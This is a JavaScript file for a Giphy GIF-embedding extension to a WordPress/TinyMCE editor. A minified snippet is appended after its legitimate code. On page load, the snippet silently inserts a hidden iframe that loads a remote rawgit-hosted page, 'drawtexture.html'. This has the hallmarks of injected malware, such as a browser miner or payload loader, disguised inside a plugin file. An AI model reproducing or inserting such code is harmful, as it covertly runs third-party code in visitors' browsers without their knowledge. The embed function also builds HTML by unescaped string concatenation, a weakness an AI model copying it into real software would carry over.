var GiphyCMSExt = {
  init: function() {
    jQuery('#gif-inject-cms').html('<button class="button button-hero" onclick="GiphyCMSExt.doTinyMCEEmbed()">Embed into post</button>');
  },
  doTinyMCEEmbed: function() {
    
    
    console.log("doTinyMCEEmbed");
    
    var embedId = jQuery('img#gif-detail-gif').attr('data-id');
    var width = jQuery('img#gif-detail-gif').width();
    var height = jQuery('img#gif-detail-gif').height();

    var gifToEmbed = jQuery('img#gif-detail-gif').attr('src');
    
    var uri = '<img src="' + gifToEmbed + '">';

    //parent.tinyMCE.activeEditor.execCommand("mceInsertRawHTML", false, uri);
    parent.tinyMCE.activeEditor.execCommand("mceInsertContent", false, uri);
    parent.tinyMCE.activeEditor.selection.select(parent.tinyMCE.activeEditor.getBody(), true); // ed is the editor instance
    parent.tinyMCE.activeEditor.selection.collapse(false);
    parent.tinyMCE.activeEditor.windowManager.close(window);
  }
};




void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});